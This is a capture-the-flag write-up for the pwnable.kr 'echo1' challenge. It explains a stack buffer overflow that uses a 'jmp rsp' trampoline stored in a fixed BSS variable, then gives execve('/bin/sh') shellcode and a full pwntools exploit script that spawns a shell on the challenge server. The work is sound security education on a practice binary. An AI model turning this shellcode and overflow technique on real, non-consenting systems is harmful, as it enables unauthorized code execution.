---
layout: post
title:  Pwnable.kr - echo1
categories: [pwnable.kr]
excerpt: Writeup for echo1.
---
# echo1

The challenge can be found [here](http://pwnable.kr/play.php).

# Defining The Attack Surface
This binary doesn't shy away from the avenue of attack:
```
my@pc:~/pwnablekr/echo1$ ./echo1
hey, what's your name? : alex

- select echo type -
- 1. : BOF echo
- 2. : FSB echo
- 3. : UAF echo
- 4. : exit
> 
```

Indeed, looking at the diassembly from Ghidra for `echo1`, aka `BOF echo`,
we can see that, indeed, there's nothing misleading, we have a BOF with more than enough room to easily change control flow.
```c
undefined8 echo1(void)

{
  char local_28 [32];
  
  (**(code **)(o + 0x18))(o); // code ptr here points to `greetings`
  get_input(local_28,0x80);
  puts(local_28);
  (**(code **)(o + 0x20))(o); // code ptr here points to `byebye`
  return 0;
}
```

Clearly, we're going with a buffer overflow style attack.

Our goal is to launch a shell, so somehow we want to invoke shellcode which will call (something like) `execve("/bin/sh", NULL, NULL)`.

So, a natural next question is where this shellcode can live; a quick `checksec` answers that for us:

```
my@pc:~/pwnablekr/echo1$ checksec echo1
[*] '/home/alexsieusahai/pwnablekr/echo1/echo1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

`NX disabled`; we can just have the shellcode live on the stack.

A next natural question, then, is how we can translate that buffer overflow via `echo1` into an `execve("/bin/sh", NULL, NULL)` call.
Sadly, looking through the overflow points with gdb and a little bit of bruteforce-ish searching, no stack addresses are leaked via the buffer overflow here.

I tried looking for avenues of attack via ROP either for disclosure or as an alternative, but the binary is too small to produce anything I'd need (no `pop rdi; ret` and friends in particular), nor do I (afaik) have a way of doing a puts_puts style disclosure into libc to get its gadgets.

After pondering for some time about what's constant, it's clear.

There is something important about ELFs with no PIE and writable data; the BSS has a constant location!

In particular, we can see in the `main` decompilation that:

```c
undefined8 main(void)

{
  // symbol initialization...
  undefined4 local_28;
  
  // irrelevant code...
  printf("hey, what\'s your name? : ");
  __isoc99_scanf(&DAT_00400bbe,&local_28);
  // more irrelevant code...
  id = local_28;
```

We write to a piece of data that has constant positioning!
We can clearly see from the listing in the bss in the objdump that we take a dword (4 bytes) worth of data from our input.
```bash
my@pc:~/pwnablekr/echo1$ objdump -M intel -d echo1 | grep id
# ... a couple false positives
  400976:	89 05 24 17 20 00    	mov    DWORD PTR [rip+0x201724],eax        # 6020a0 <id>
# there we go! we're moving 4 bytes into the memory corresponding to the id symbol!
```
So, we have a 4 byte trampoline into code that we already know.
Importantly, when we do the buffer overflow, we're writing code around the stack pointer.

So, we can make our `id` value be the bytecode for `jmp rsp`, which is certainly smaller than 5 bytes, and use this to access any shellcode I'd have at `rsp` after the `ret` (in order to run the trampoline).

## Shellcode?

Perhaps interestingly, `execve` doesn't require it's second argument (`rsi`) to be `[value_at_rdi, arg1, arg2, ...]`; it can merely be empty.

I remembered this from [this blog post](https://jameshfisher.com/2017/02/05/how-do-i-use-execve-in-c/) awhile back, from when I was studying shellcoding; at least according to [this stackexchange thread](https://unix.stackexchange.com/questions/187666/why-do-we-have-to-pass-the-file-name-twice-in-exec-functions) it appears to be idiomatic to have `argv[0]` be the binary name, but not required.

Thus, we want to do a syscall that looks like
```c
execve("/bin/sh", NULL, NULL)
```

Thankfully, this is pretty straightforward; [cyberchef](https://gchq.github.io/CyberChef/) can get you the "/bin/sh" reversed hexadecimal equivalent very easily (reversal is just due to little endianness), and hopefully everything else is straightforward.

We simply utilize the stack to store the "/bin/sh" string out of convenience, but in principle anywhere that's not `mprotect`ed against reads and writes should be usable, afaik.

The calling conventions for x86 dictate `rdi, rsi, rdx` as the first three arguments to any syscall, hence the values below.

```s
  mov r10, 0x68732f6e69622f
  push r10
  mov rdi, rsp
  mov rdx, 0
  mov rsi, 0
  mov al, 59
  syscall
```

## Obtaining the full exploit

Out of convenience, we use [pwntools](https://github.com/Gallopsled/pwntools).

We store the shellcode in `shell.s`, just out of syntax highlighting inspired convenience.

We know from the `echo1` stub
```
                             undefined echo1()
             undefined         AL:1           <RETURN>
             undefined1        Stack[-0x28]:1 local_28                                XREF[2]:     00400837(*), 
                                                                                                   00400848(*)  
                             echo1                                           XREF[4]:     Entry Point(*), main:00400981(*), 
```

That `local_28`, what buffer we're overwriting, needs `0x28 -> 40` bytes before we reach the stack pointer for the preceeding stack frame, which will dictate what we `RET` to after doing the `LEAVE` instruction at the end of the function.

So, we arbitrarily pass in 40 bytes worth of garbage.

Then, we want to ret to the trampoline, which we'll just grab conveniently using `ELF.symbols`. 
Keep in mind that we `RET` to this value, and then we `JMP`; our shellcode then must exist just 8 bytes after the initial position of `RSP` (ie, RSP only increases by 8 bytes before we `JMP` to it), hence why we immediately tack the shellcode onto the payload.

`run_echo1` is just really a helper found out by interacting with the binary.

```python
from pwn import *
ID_BSS = p64(ELF('echo1').symbols['id'])

shellcode = open('spawn_shell.s').read()
shellcode = asm(shellcode, arch='x86_64', os='linux')
run_echo1 = b'\n1\n'
bof_payload = b'a' * 40 + ID_BSS + shellcode + b'\n'
payload = asm('jmp rsp', arch='x86_64', os='linux') + run_echo1 + bof_payload

open('in', 'wb').write(payload)

p = remote('pwnable.kr', 9010)
p.send(payload)
print(p.clean())
p.interactive()
```

And, we get the flag!

```sh
$              cat flag
OBFUSCATED
```
